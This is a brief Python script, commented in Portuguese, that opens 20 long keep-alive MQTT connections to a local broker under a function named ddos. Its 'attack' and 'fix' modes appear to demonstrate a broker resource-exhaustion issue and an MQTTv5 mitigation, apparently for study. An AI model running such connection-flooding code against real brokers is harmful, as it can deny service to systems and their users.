import paho.mqtt.client as mqtt
import subprocess
import sys
import time

def ddos():
  keep_alive = 500
  n_clients = 20
  print(f'Inicializando {n_clients} MQTT com keep-alive {keep_alive}')

  # Cria e conecta os clientes
  for i in range(n_clients):
    print(f'Conectando o client {i} com keep-alive', keep_alive)

    if sys.argv[1] == 'fix':
      client = mqtt.Client(f'client{i}', protocol=mqtt.MQTTv5)
    elif sys.argv[1] == 'attack':
      client = mqtt.Client(f'client{i}')

    client.connect('0.0.0.0', 1883, keep_alive)

  # Aguarda para o programa não finalizar
  input("\nAperte qualquer tecla para finalizar...")

if __name__ == '__main__':
  ddos()